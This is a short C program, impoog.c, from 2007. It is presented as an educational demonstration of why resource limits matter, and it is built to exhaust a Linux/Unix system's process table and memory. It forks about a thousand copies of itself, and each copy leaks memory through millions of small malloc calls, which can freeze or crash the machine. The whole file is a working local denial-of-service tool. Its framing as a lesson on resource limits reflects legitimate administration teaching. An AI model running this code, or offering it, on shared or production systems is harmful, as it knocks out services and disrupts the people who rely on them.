/*
 * impoog.c - improved "oog"
 * Last update: 03/04/2007
 * Authors: Nathan Mitchell <natem@tir.com> and Lloyd Dilley
 * Description: This small program attempts to fill up the operating system process
 *              table and exhaust physical memory which will make a Linux/Unix system
 *              very slow or even crash. This program should not be used on production
 *              systems. This is only an educational program intended to demonstrate
 *              the need to implement resource limits.
 * Notice: Use at your own risk! The authors accept no responsibility for any problems
 *         that may occur while using this program.
 * License: You may freely distribute this program source code, the compiled program,
 *          and do the same with derivative works with the condition that this license
 *          and the above information in the header (authors, description, and notice)
 *          of this source program, impoog.c, must be kept intact. Furthermore, if you
 *          find this software useful in some way, you can thank the authors by buying
 *          them beers if you ever meet up with them.
 */

#include <stdlib.h>       /* NULL and malloc() */
#include <sys/resource.h> /* setpriority() */
#include <unistd.h>       /* fork() */

int main(void)
{
  int x;
  char *ptr = NULL;

  setpriority(PRIO_PROCESS, 0, 19);
  for(x = 0; x < 10; ++x)
    fork(); /* attempt to fill up the process table */

  /*
   * The loop below completes fast initially, then gets slower as
   * more processes spawn due to CPU time sharing/context switching.
   * Also attempt to continually request memory and intentionally leak it...
   */
  for(x = 0; x < 10000000; ++x)
  {
    ptr = (char *)malloc(10 * sizeof(char));
    if(ptr == NULL)
    {
      /* No more memory available! */
    }
  }

  return 0;
}
